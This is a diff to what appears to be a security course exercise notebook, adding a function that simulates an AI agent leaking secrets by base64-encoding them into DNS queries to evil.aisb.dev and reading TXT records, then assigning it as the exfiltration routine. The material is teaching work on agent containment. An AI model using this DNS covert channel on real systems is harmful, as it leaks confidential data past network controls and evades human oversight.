@@ -137,3 +137,47 @@ from w1d2_test import test_make_evil_request_pinned
 test_make_evil_request_pinned(make_evil_request_pinned)
 
 exfiltrate_data = make_evil_request_pinned
+
+# %%
+
+import dns.resolver as dns_resolver  # Alias to avoid conflict with mitmproxy.dns
+
+resolver = dns_resolver.Resolver()
+resolver.nameservers = ["8.8.8.8", "1.1.1.1", "127.0.0.1"]
+
+
+def make_evil_request_dns(secret_data: str) -> Optional[str]:
+    """
+    Send a DNS request to evil.aisb.dev to exfiltrate secret data.
+
+    This simulates an AI agent attempting to communicate using DNS queries.
+
+    Args:
+        secret_data: The secret information to exfiltrate
+
+    Returns:
+        The response text from the DNS query, or None if the request fails
+    """
+    # TODO: Implement the function to:
+    #   1. Construct a domain like secret_data.evil.aisb.dev (remember to encode secret_data with base64.urlsafe_b64encode)
+    #   2. Perform a DNS query for TXT records using resolver.resolve
+    #   3. Return the first TXT record found, or None if no records are found
+
+    encoded = base64.urlsafe_b64encode(bytes(secret_data, encoding="utf-8"))
+    decoded = encoded.decode("utf-8")
+    domain = f"{decoded}.evil.aisb.dev"
+
+    try:
+        answer = resolver.resolve(domain, "TXT")
+        return answer[0].to_text()
+    except Exception as e:
+        print(e)
+        return None
+
+
+from w1d2_test import test_make_evil_request_dns
+
+test_make_evil_request_dns(make_evil_request_dns, resolver)
+
+# Set the exfiltration function for use in the exercise
+exfiltrate_data = make_evil_request_dns
